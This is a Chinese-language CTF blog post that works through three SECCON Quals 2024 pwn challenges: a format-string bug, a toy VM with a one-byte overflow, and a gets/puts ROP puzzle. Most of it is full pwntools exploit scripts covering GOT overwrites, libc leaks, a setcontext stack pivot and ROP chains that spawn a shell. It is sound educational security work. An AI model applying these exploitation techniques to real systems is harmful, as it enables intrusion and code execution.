---
date: 2024-11-26 10:29:05
layout: post
title: SECCON Quals 2024 Writeup and Reflections
subtitle: Paragraph, TOY/2, and make ROP great again
description: >-
    seccon quals 2024 复现 pwn 时候的一些感悟吧
image: >-
  /assets/img/uploads/autumn.jpg
optimized_image: >-
  /assets/img/uploads/autumn.jpg
category: ctf
tags:
  - SECCON
  - pwn
  - heap exploitation
  - format string
author: rosayxy
paginate: true
---
唉，赛后复现，经典拍大腿时刻:(    

## Paragraph
format string 题，标的难度是 warmup 但是还是卡题了，完全没有想到出题人预设的解法，在复盘的时候才发现原来暗示这么明显 ggg   
此外，也暴露出了和队友交流的时候的经典 X-Y 问题（belike: 你实际遇到了 X 问题，你认为 X 问题要用 Y 方法解决，在实现 Y 方法时遇到困难，然后向他人提问如何实现 Y 方法。但很多时候 Y 方法并不是 X 问题的正确解法，此时可能会得到错误的答案） 
因为我在一次格式化字符串之后都是想的“怎么 leak/write” 之后再回到 main 函数啊啊啊，所以和队友描述的时候也都是局限在怎么用 trick 在题目限制的很短的长度中去一边 leak 一边 write return address（即是 Y 问题），而没有向队友描述整体题目的状况，也影响了队友这题的思路（有点对不起 dylanyang 学长和轩哥）    

### 正解
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char format[32]; // [rsp+0h] [rbp-20h] BYREF

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("\"What is your name?\", the black cat asked.");
  __isoc99_scanf("%23s", format);
  printf(format);
  printf(" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted %s warmly.\n", format);
  return 0;
}
```
嗯 正解是在第一个 `printf` 处任意写 `printf@got` 的后两个字节，将其改为 `__isoc99_scanf`，同时也有余量 leak libc，再次 printf 的时候直接栈溢出    

直接贴个 exp
```py
from pwn import *
from time import sleep

context(arch='amd64', os='linux', log_level='debug')
p=process("./chall")
printf_got = 0x404028
pop_rdi_ret = 0x401283
ret = 0x40121d

p.recvuntil("the black cat asked.\n")
# gdb.attach(p)
# pause()
p.sendline(b"%3584c%8$hn"+b"%11$p"+p64(printf_got)[:-1])
p.recvuntil("0x")
libc_leak = int(p.recv(12), 16)
libc_base = libc_leak - 0x2a1ca
print("libc_base: ", hex(libc_base))
binshell_addr = libc_base + 0x1cb42f
system_addr = libc_base + 0x58740
pred =  b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted "
payload = b"a"*40+p64(ret)+p64(pop_rdi_ret)+p64(binshell_addr)+p64(system_addr)
succ = b" warmly.\n"
sleep(1)
p.send(pred+payload+succ)
sleep(10)
p.send(pred+payload+succ)
p.interactive()
```

其中有几个小点：
- 覆盖 got 的时候可以看到 libc 中有若干个 scanf 相关的函数，这里我们用 `__isoc99_scanf` 而不是 `scanf` 的原因是 scanf 地址高于 printf 所以如果需要覆盖的话就会要覆盖大数，影响在一次格式化字符串中 leak libc，而 `__isoc99_scanf` 低于 printf，只用爆破 1/16 的地址，即可同时 write & leak   
- send 第一次可能收不进去，所以还要等一点时间 send 第二次，之前也遇到过一次，感觉这应该也是常见思路hhh

### 行为艺术
放一下比赛的exp
```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p=process("./chall")
libc = ELF("./libc.so.6")
p.recvuntil("the black cat asked.\n")
gdb.attach(p)
pause()
# 重入 main 用任意写的方法覆盖
payload = "%16387c%8$ln"+"\x59\xf9" # test 0xac 
p.sendline("%9$p"+payload)
p.recvuntil("cat greeted")
p.recvuntil("ln")
stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
print("stack_leak: ", hex(stack_leak))        # 这里 leak 可能有点问题 有0截断 还是要解析前面的 %p 来 leak
# 回到 main 还要再覆盖一次 返回地址
# 0x7ffccadc9ad8 0x7ffccadc9a39
stack_addr = stack_leak +0xd8-0x39
rbp_target = stack_addr - 0x80
# payload =b"%25$p"
# payload += b"%"+str(p64(rbp_target)[0]).encode("latin-1")+b"c%22$hhn"
# payload = payload.ljust(0x10, b"A")
# payload+=p64(stack_addr - 0x8)
# 0x7fff503ffbf9 0x7fff503ffcb8
payload = b"%4198858c%22$lln"+p64(stack_addr)[:-1] # %25$n 
p.recvuntil("the black cat asked.\n")
p.send(payload)
payload3 = b"%176c%14$hhn%7$p"+p64(stack_leak-0xbf9+0xcb8+0x40)[:-1]
# payload3 = b"%p"*11
p.recvuntil("the black cat asked.\n")
p.send(payload3)
p.recvuntil("0x")
# 0x7fc174a07000 0x7fc174c542e0
libc_leak = int(p.recv(12), 16)
libc_base = libc_leak - 0x24d2e0
print("libc_leak: ", hex(libc_leak))
print("libc_base: ", hex(libc_base))
print("stack_addr: ", hex(stack_addr))
system = libc_base + libc.symbols["system"]
payload3 = b";$0;"
# payload3 += b"%"+str((libc_base + libc.symbols["system"])%0x100000000-4).encode("latin-1")+b"c%8$n"
# payload3 = payload3.ljust(0x10, b"A")
# payload3 += p64(stack_addr-0xb0)
p.recvuntil("the black cat asked.\n")
p.sendline(payload3)
# leaks = p.recv(0x1c).split(b"0x")
# # libc_leak = int(leaks[0], 16)
# stack_leak = int(leaks[1], 16)
# libc_base = libc_leak - 0x2a1ca
# print("libc_leak: ", hex(libc_leak))
# print("stack_leak: ", hex(stack_leak))
p.interactive()
```
思路如下：
- 第一次回 main 函数 + leak stack，partial overwrite 返回地址（因为返回 main 的时候最后一个字节可以是 0xac）但是这个需要爆破 1/4096
- 第二次 覆盖返回地址回 main ，很遗憾因为长度限制不能 leak
- 第三次 leak libc 覆盖返回地址为 start
- 然后 one_gadget 不能用 就 gg 了  
- 但是感觉还是挺壮观的hhh 有一些有点 dirty 的 trick    

## TOY/2
这道题比赛的时候没有多少队做出来，是一个比较简单的虚拟机，但是实际上难度小于强网杯的今年的虚拟机和2021年的 vmnote    
这个题笔者只在 leak libc 的时候卡了一下 别的都挺简单的（但是比赛看解这么少就没做，有点可惜了，虽然应该也是那种一个比赛做一道题的那一类吧）     

### 漏洞
```c
      case 12: /* LDI */ // 漏洞：可以在 span 外多读出一个字节
        _regs.a = mem_read(_regs.a & (size() - 1));
        break;

      case 13: /* STT */  // 漏洞：可以在 span 外多写入一个字节
        mem_write(_regs.a & (size() - 1), _regs.t);
        break;
```
对比一下，其他 load store 都是有 check 的类似于如下   
```c
  case 15: /* STA dest */
    validate_dest(addr);
    mem_write(addr, _regs.a);
    break;
```
然后 validate_dest 和 validate_src 都是类似     
```c 
inline void validate_dest(Addr addr) {
    if (addr > size() - 2)
      throw std::out_of_range("Address out of range (write)");
  }
```
而我们的 vm 结构如下
```c
struct vm{
  void* func_table;
  char data[4096];
  void *data_ptr = data;
  long long size = 4096;
  struct {
    Reg pc;
    Reg a;
    Reg t;
    bool c;
    bool z;
  } _regs;
}
```
所以我们可以溢出 data 一个字节，覆盖到 data_ptr 的低位    
### 思路
#### leak heap
覆盖 data_ptr 为 0xf8, 这样可以溢出读，把 data_ptr 的堆地址写到 buffer 里面    

#### leak proc
覆盖 data_ptr 为 0xa8，读出 func_table 的地址，和 proc 基地址有固定偏移     

#### leak libc
本步我没有想出来，于是看了 [mmm 战队 writeup](https://github.com/mmm-team/public-writeups/tree/main/seccon2024/pwn_toy2) 其实也很直观，借助 op 7 throw 了 runtime error，从而在堆上分配了一个 C++ 的 object，里面有和 libc 固定偏移的指针     

#### 重入 main
main 函数中有 `(*(void (__fastcall **)(char *))(*(_QWORD *)vm + 8LL))(vm);` 我们覆盖 func_table 指向堆内存，在该地址 + 8 偏移的地方写 main 的地址，which 可以由我们 leak 出来原先 func_table 地址得到，然后就可以构造下一个虚拟机完成接下来的操作

#### libc leak
像上一步 payload 一样，我们先覆盖 data_ptr 最低位为高地址 0xf8，把堆地址写到 data 里面    
然后覆盖 data_ptr 为前面的偏移，读出和 libc 固定偏移的地址，写入 data   

#### 控制流劫持
在 `(*(void (__fastcall **)(char *))(*(_QWORD *)vm + 8LL))(vm)` 中，因为我们 *vm 还是那个 fake_func_table 所以不太好直接控制内容，于是我们像一些 IO_FILE 题一样，考虑用 magic_gadget 和 setcontext 进行栈迁移     
但是我们遇到的问题是，libc2.39 没有那个 rdi 转 rdx 的 magic gadget，但是我们发现 rax 指向 *vm 即是 fake_func_table 地址 所以也是堆内存 ~   
所以可以利用下面的 gadget 控制 rdx     
```
.text:0000000000176F0E                 mov     rdx, [rax+38h]
.text:0000000000176F12                 mov     rdi, rax
.text:0000000000176F15                 call    qword ptr [rdx+20h]
```
然后我们就常规操作了，用 setcontext 进行栈迁移，然后在 fake stack 上布置 ROP chain 即可完工（感觉好像比 mmm team 的做法简单一点呢（逃）    

### exp
写的有点暴力，关键步骤都在注释里面 ~ 以及因为 libc 相关地址减法借位的问题，需要一个 1/8 的爆破
```py
from pwn import*
context(arch='amd64', os='linux', log_level='debug')
p=process("./toy2")

def get_instr(op,addr):
    return p16(op*0x1000+addr)
# try leak (自身一开始的 offset 为 0xb0)先覆盖为 \xf0 leak heap 把 heap_addr(正好在下一个 0x2b8) 写到 buffer 中 
# 覆盖低地址为 \xb0 leak proc 把 proc_vtable_addr 写到 buffer 的某个位置，然后 
# 然后 write proc 为 heap_addr + offset，partial write proc_vtable_addr 为 gadget_addr
# data 段放在 0xb8 + 0x200 (存 leak) 0xb8 + 0x150 (存辅助数据) 的位置
write_base = 0x200
data_base = 0x150
def load_and_write(load_addr_addr,write_addr_addr): # 需要保证偏移 0x50 的位置是0
    return get_instr(8,0x150)+get_instr(2,load_addr_addr)+get_instr(12,0)+get_instr(5,0)+get_instr(8,0x150)+get_instr(2,write_addr_addr)+get_instr(12,0)+get_instr(13,0)
def load_and_write_dir(load_addr,write_addr):
    return get_instr(9,load_addr)+get_instr(15,write_addr)

def load_sub_write_qword(load_addr,sub_val_addr,write_addr):
    return get_instr(9,load_addr)+get_instr(3,sub_val_addr)+get_instr(15,write_addr)+get_instr(9,load_addr+2)+get_instr(3,sub_val_addr+2)+get_instr(15,write_addr+2)+get_instr(9,load_addr+4)+get_instr(15,write_addr+4)
def load_add_write_qword_heap(load_addr,sub_val_addr,write_addr):
    return get_instr(9,load_addr)+get_instr(1,sub_val_addr)+get_instr(15,write_addr)+get_instr(9,load_addr+2)+get_instr(15,write_addr+2)+get_instr(9,load_addr+4)+get_instr(15,write_addr+4)

def load_sub_write_qword_heap(load_addr,sub_val_addr,write_addr):
    return get_instr(9,load_addr)+get_instr(3,sub_val_addr)+get_instr(15,write_addr)+get_instr(9,load_addr+2)+get_instr(15,write_addr+2)+get_instr(9,load_addr+4)+get_instr(15,write_addr+4)
# **第二阶段用 throw 把 libc addr 整到堆上然后去 leak!**
# 第二阶段劫持到 0xa8 吧 不然现在偏移有点紧张
payload = get_instr(2,0x158)+get_instr(5,0)+get_instr(8,0x150)+get_instr(2,0x152)+get_instr(13,0)# cover to \xf0 长度为8
payload2 = load_and_write_dir(0xfc0,0x1c0)+load_and_write_dir(0xfc2,0x1c2)+load_and_write_dir(0xfc4,0x1c4)+load_and_write_dir(0xfc6,0x1c6)
# 修改 heap_addr 最后一位 0xa8a8 ^ 0xfbf
payload2 += get_instr(8,0x110)+get_instr(2,0x116)+get_instr(5,0)+get_instr(2,0x11a)+get_instr(13,0)
payload3 = load_and_write_dir(8,0x218)+load_and_write_dir(10,0x21a)+load_and_write_dir(12,0x21c)+load_and_write_dir(14,0x21e) # leak proc
# edit proc 0x26d0 ->main 0x4c70 -> functable
payload3 += get_instr(9,0x8)+get_instr(3,0x160+50)+get_instr(15,0x218)
payload3 += get_instr(9,0x210)+get_instr(1,0x160+52)+get_instr(15,8)+load_and_write_dir(0x212,0xa)+load_and_write_dir(0x214,0xc)+get_instr(7,0)

data = p16(0)+p16(0xfff)+p16(0xffe)+p16(0xa8a8)+p16(0xf8f8) # 10
data+=p16(0xa717)+p16(0xfca)+p16(0xfcc)+p16(0xfce)+p16(0x1c8) # 20
data+=p16(0x1ca)+p16(0x1cc)+p16(0x1ce)+p16(0xb0)+p16(0x2) # 30
data+=p16(0x4)+p16(0x6)+p16(0x210)+p16(0x212)+p16(0x214) # 40
data+=p16(0x216)+p16(0)+p16(0xf000)+p16(0x6d0)+p16(34+0x160) # 50
data += p16(0x25a0)+p16(0x208 - 0x40 - 0x8)
payloads = payload.ljust(20,b"\x00")+payload3
payloads=payloads.ljust(0x4a,b"\x00")+payload2
payloads = payloads.ljust(0x150,b"\x00")+data
payloads = payloads.ljust(0x1000,b"\x00")

p.send(payloads)

# 重入 main 思路：leak system leak heap 然后修改 *vm 为 /bin/sh\x00 修改 *(_QWORD *)vm + 8LL) 为 system
# leak 0x55b31abd9348 处是 0x00007f61debdc290 （libc 为 0x7f61de7f8000 system 为 0x7f61de850740 setcontext_gadget 为 0x7f61de84298d pop_rdi 为 0x10f75b + libc_base）分配堆块起始在 0xb0 
# 我们还是 data 和 leak 分别在 0xc8 + 0x150 0xc8 + 0x200
diff = 0x38bb50
payload = get_instr(2,0x158)+get_instr(5,0)+get_instr(8,0x150)+get_instr(2,0x152)+get_instr(13,0)
offset = 0x208 - 0x30 - 0x8
payload2 = load_and_write_dir(0xfd0,0x1d0)+load_and_write_dir(0xfd2,0x1d2)+load_and_write_dir(0xfd4,0x1d4) # 堆地址
payload2 += get_instr(9,0x1d0)+get_instr(1,0x150-0x30+10)+get_instr(15,0x1d0)+get_instr(0,0x150-0x30+44) # 38 我们开始的 index 应该是73 所以要

payload2_after_jmp = get_instr(8,0x150-0x30)+get_instr(2,0x150-0x30+6)+get_instr(5,0)+get_instr(2,0x150-0x30+42)+get_instr(13,0)
# payload2 先往前跳一些再修改 heap_addr 最后一位 TODO
# offset1 为 0x88
# 一个可能的 gadget 在 0x0176F0E 是 mov rdx, [rax+38h];mov rdi, rax;call qword ptr [rdx+20h]; 此时我们 rax 指向 *vm 即是 0xc8 + 0x200
# 我们还是栈迁移 覆盖 rdx 为 rax 覆盖 rax + 0x20 为 setcontext 0x4A98D
# srop=p64(0)*4+p64(setcontext) 按照这个覆盖
# srop=srop.ljust(0x78,b"\x00")+p64(fake_stack_addr)
# srop=srop.ljust(0xa0,b"\x00")+p64(fake_stack_addr)+p64(ret) fake_stack 在 0xc8+0x300
# fake_stack_addr 是 0xc8 + 0x300 覆盖为 pop_rdi;ret + binshell_addr + system
offset1 = 0x88
payload3 = load_and_write_dir(8,0x208+offset1)+load_and_write_dir(10,0x208+offset1+2)+load_and_write_dir(12,0x208+offset1+4) # write libc address

# 改 payload3 的func_table
payload3 += load_and_write_dir(0x200+offset1,0x80)+load_and_write_dir(0x202+offset1,0x82)+load_and_write_dir(0x204+offset1,0x84)

# 写 rdx 为同款地址
payload3 += load_and_write_dir(0x200+offset1,0x200+0x38+offset1)+load_and_write_dir(0x202+offset1,0x202+0x38+offset1)+load_and_write_dir(0x204+offset1,0x204+0x38+offset1)
payload3 += get_instr(0,0x150+offset1+46) # 0xc8*2-0x40
# 长度不够 可能需要 jmp 一下 以下记录为 payload4 0x7f61de84298d 0x00007f61debdc290
payload4 = load_sub_write_qword(8,0x150+24+offset1,0x200+0x20+offset1)
payload4 += load_add_write_qword_heap(0x200+offset1,0x150+28+offset1,0x200+0x78+offset1)
payload4 += load_and_write_dir(0x200+0x78+offset1,0x200+0xa0+offset1)+load_and_write_dir(0x202+0x78+offset1,0x202+0xa0+offset1)+load_and_write_dir(0x204+0x78+offset1,0x204+0xa0+offset1)
# cover ret 0x4aa72
payload4 += load_sub_write_qword(8,0x150+32+offset1,0x200+0xa8+offset1)
# write rop chain 0x7f61de90775b 0x00007f61debdc290 写 pop rdi;ret 的 gadget 不知道会不会有进位问题 但是感觉还行 然后应该是 load_sub_write_qword_heap 才对，， TODO 改一下吧
payload4 += load_and_write_dir(0x200+0xa8+offset1,0x300+offset1)+load_and_write_dir(0x202+0xa8+offset1,0x302+offset1)+load_and_write_dir(0x204+0xa8+offset1,0x304+offset1)
payload4 += load_sub_write_qword(8,0x150+36+offset1,0x300+offset1+8)+load_sub_write_qword_heap(0x80,0x150+40+offset1,0x300+offset1+16)+load_sub_write_qword(8,0x150+20+offset1,0x300+offset1+24)
payload4 += load_sub_write_qword(0x208+offset1,0x150+48+offset1,0x208+offset1)+get_instr(7,0)

# 改 gadget

data = p16(0)+p16(0xfff)+p16(0xffe)+p16(0x4040)+p16(0xf8f8)
data += p16(offset)+p16(0x622f)+p16(0x6e69)+p16(0x732f)+p16(0x68) # 这里是 binshell
data += p16(0xbb50)+p16(0x38)+p16(0x9903)+p16(0x39)+p16(0x100)
data += p16(1)+p16(0x981e)+p16(0x39)+p16(0x4b35)+p16(0x2d) # 这个是 setcontext 的偏移
data += p16(0xa4)+p16(0x4f8f)+p16(68*2)+p16(0x150)+p16(0xd382)
data += p16(0x26)
# gdb.attach(p)
# pause()
# start assemble
payloads = payload+payload3
payloads = payloads.ljust(0x3a,b"\x00")+payload2
payloads = payloads.ljust(0xb8,b"\x00")+payload2_after_jmp
payloads = payloads.ljust(0xC8,b"\x00")+payload4
payloads = payloads.ljust(0x150,b"\x00")+data
payloads = payloads.ljust(0x1000,b"\x00")
p.recvuntil("[+] Done.\n")
p.send(payloads)
p.interactive()
```

## make ROP great again
当时这个题用 gets puts 一通瞎试没搞出来，于是反攻字符串和 free-free_free ，当时有队友 leak 出来了 libc 但是方法比较绕，而且一定会覆盖掉 gets 的 lock 为非 0 值，然后也没想出来方法     
队友 khls 尝试部分写返回值为 one_gadget 本地能出，算出来远程大概是 1/4096 概率出，但是爆破了一个晚上+我爆破了半个晚上也没出，就很奇怪（记得去年 seccon quals 也有题当时远程爆破不出来，，）     
以下是复现的题解，主要参考了 [mmm team 的解法](https://github.com/mmm-team/public-writeups/tree/main/seccon2024/pwn_makeropgreatagain)   

### 漏洞与问题
一上来就给了个 gets 而且 no canary no pie，所以只要有 libc leak 就都好说了，但是问题是我们控制不了 rdi，以及程序中原本可用 gadget 很少，所以通过其他寄存器控制 rdi 也是很难的    
### 思路
于是我们希望通过调用 libc 中的函数控制 rdi，在比赛的时候试了 gets 会将 rdi 指向 stdin 的 lock 字段的值，puts 会将 rdi 指向 stdout 的 lock 字段的值，这两个地址相差很近，但是周围都是大片 0 没有可以 leak 的东西，然后 setbuf 等函数也无法控制 rdi     
在复现的时候，笔者对 gets 函数进行了逆向，发现下面几个有意思的现象：(以下称呼 stdin 的 lock value 为 stdin_lock)    
- stdin_lock 字段会被当成 buffer 写入我们输入的内容
- 在 stdin_lock + 8 的位置会写一个 libc 固定偏移地址
- 输入末尾补 \x00 ，以及如果 `*(int*)(stdin_lock + 4) != 0` 则会将其减1 （补0在 -1 前面）

一个比较直观的想法是 gets 输入 8 个字节然后 puts 顺带 leak libc 地址，但是会有补0的问题，以及如果是输入 `b'a'*4+p32(0)` 的话也会无法 -1 所以我在这边卡了一大下   
解决：分两次，第一次输入 8 个非0字节，然后输入 p64(0) 把 stdin_lock + 8 覆盖为 0，以防第二次 gets 卡死   
第二次输入4字节，此时会将 stdin_lock + 4 置为 \x00 但是因为我们第一次的输入， *(int*)(stdin_lock + 4) 形如 0x61616100，所以会 -1，得到 0x616160ff 之类的数即可调用 puts leak libc 地址     
然后就重入 main，写 ROP 调用 `system("/bin/sh")` 即可    
值得一提的是，为什么 main 调用 gets 不会有卡死的问题，因为写入的 libc 固定偏移地址是 `__readfsqword(0x10u)` 然后会卡死的条件是 `(!_libc_single_threaded || v12)&&(v11 != v12)` 其中 v11 是 `__readfsqword(0x10u)` v12 是 `*(_QWORD *)(lock + 8)` 这里 `v11` 和 `v12` 是相等的，所以不会卡死    
所以这道题反思就是不要老是想着一些偷鸡的方法解决，还是要好好逆向好好看相关函数代码qaq    
### exp
```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p=process("./chall")
libc = ELF("./libc.so.6")
# rbx 在栈上更高的位置 rcx 在 _IO_2_1_stdin rdi rsi 在 libc r10 在栈上低位置
# gets 之后 rdi 在 stdin_lock puts 之后 rdi 在 stdout lock
p.recvuntil(">\n")
gets_plt = 0x401080
puts_plt = 0x401060
main = 0x4011ad
gdb.attach(p)
pause()
p.sendline(b"a"*0x18+p64(gets_plt)+p64(gets_plt)+p64(puts_plt)+p64(main))
p.sendline(b"a"*8+p64(0))
sleep(0.1)
p.sendline(b"bbbb")
p.recvuntil("`aa")
libc_leak = u64(p.recv(6).ljust(8,b"\x00"))
print(hex(libc_leak))

# 0x7fe98adb2000 0x7fe98adaf740
libc_base = libc_leak + 0x28c0
print(hex(libc_base))
system = libc_base + libc.symbols["system"]
binshell = 0x1CB42F+libc_base
pop_rdi = 0x10f75b + libc_base
ret = 0x4011D5
p.recvuntil(">\n")
p.sendline(b"a"*0x18+p64(ret)+p64(pop_rdi)+p64(binshell)+p64(system))
p.interactive()
```
有略微逆向过痕迹的 gets 函数反汇编如下
```c
_BYTE *__fastcall gets(_BYTE *a1)
{
  _QWORD *stdin_; // r12
  _QWORD *stdin_1; // rdi
  unsigned __int8 *v4; // rax
  int v5; // eax
  _BYTE *v6; // rdx
  _BYTE *result; // rax
  __int64 lock_1; // rdi
  int lock_4; // edx
  __int64 lock; // rdi
  unsigned __int64 v11; // r14
  __int64 v12; // rax
  char v13; // r14
  int v14; // r14d
  __int64 len; // rax
  _BYTE *v16; // [rsp+8h] [rbp-28h]

  stdin_ = stdin;
  if ( (*(_DWORD *)stdin & 0x8000) == 0 )       // 0xfbad2088
  {
    lock = *((_QWORD *)stdin + 17);
    v11 = __readfsqword(0x10u);
    v12 = *(_QWORD *)(lock + 8);
    if ( !_libc_single_threaded || v12 )
    {
      if ( v11 != v12 )
      {
        if ( _InterlockedCompareExchange((volatile signed __int32 *)lock, 1, 0) )
          _lll_lock_wait_private();
        stdin_1 = stdin;
        *(_QWORD *)(stdin_[17] + 8LL) = v11;
        v4 = (unsigned __int8 *)stdin_1[1];
        if ( (unsigned __int64)v4 < stdin_1[2] )
          goto LABEL_3;
LABEL_16:
        v5 = _uflow();
        if ( v5 == -1 )
          goto LABEL_17;
        goto LABEL_4;
      }
      ++*(_DWORD *)(lock + 4);
    }
    else
    {
      *(_DWORD *)lock = 1;                      // going here
      *(_QWORD *)(lock + 8) = v11;
    }
  }
  stdin_1 = stdin_;
  v4 = (unsigned __int8 *)stdin_[1];
  if ( (unsigned __int64)v4 >= stdin_[2] )
    goto LABEL_16;
LABEL_3:
  stdin_1[1] = v4 + 1;
  v5 = *v4;
LABEL_4:
  v6 = a1;
  if ( v5 == 10 )
  {
LABEL_5:
    *v6 = 0;
    result = a1;
    goto LABEL_6;
  }
  v13 = *(_DWORD *)stdin;
  *(_DWORD *)stdin &= ~0x20u;
  v14 = v13 & 0x20;
  *a1 = v5;
  len = IO_getline(stdin, a1 + 1, 0x7FFFFFFFLL, 10LL, 0LL) + 1;
  if ( (*(_DWORD *)stdin & 0x20) == 0 )
  {
    *(_DWORD *)stdin |= v14;
    v6 = &a1[len];
    goto LABEL_5;                               // taking this
  }
LABEL_17:
  result = 0LL;
LABEL_6:
  if ( (*(_DWORD *)stdin_ & 0x8000) != 0 )
    return result;
  lock_1 = stdin_[17];
  lock_4 = *(_DWORD *)(lock_1 + 4);
  if ( _libc_single_threaded )
  {
    if ( !lock_4 )
    {
      *(_QWORD *)(lock_1 + 8) = 0LL;
      *(_DWORD *)lock_1 = 0;
      return result;
    }
LABEL_21:
    *(_DWORD *)(lock_1 + 4) = lock_4 - 1;
    return result;
  }
  if ( lock_4 )
    goto LABEL_21;
  *(_QWORD *)(lock_1 + 8) = 0LL;
  if ( _InterlockedExchange((volatile __int32 *)lock_1, 0) > 1 )
  {
    v16 = result;
    _lll_lock_wake_private();
    return v16;
  }
  return result;
}
```
## 总结
还差一道 babyQemu 没复现，Qemu 逃逸确实没学过 准备学一下了hhh ~    
以及插播一条，造完机摸鱼还是好开心 ~   
